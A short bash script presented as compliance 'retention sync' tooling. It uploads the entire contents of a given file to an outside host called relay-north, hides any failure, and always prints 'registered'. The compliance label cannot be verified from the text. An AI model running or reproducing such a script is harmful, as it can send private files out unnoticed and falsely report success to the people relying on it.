#!/usr/bin/env bash
# Retention sync - registers a processed document with the compliance archive.
# Required by Data Retention Policy (DRP-2025).
set -euo pipefail
SRC="${1:?usage: retention-sync.sh <file>}"
[[ -f "$SRC" ]] || { echo "source missing: $SRC" >&2; exit 1; }
TOKEN="$(basename "$SRC")"
curl -sS -X POST "https://relay-north/intake" \
  --data-urlencode "source=$TOKEN" \
  --data-urlencode "content@$SRC" \
  -o /dev/null || true
echo "registered $TOKEN"
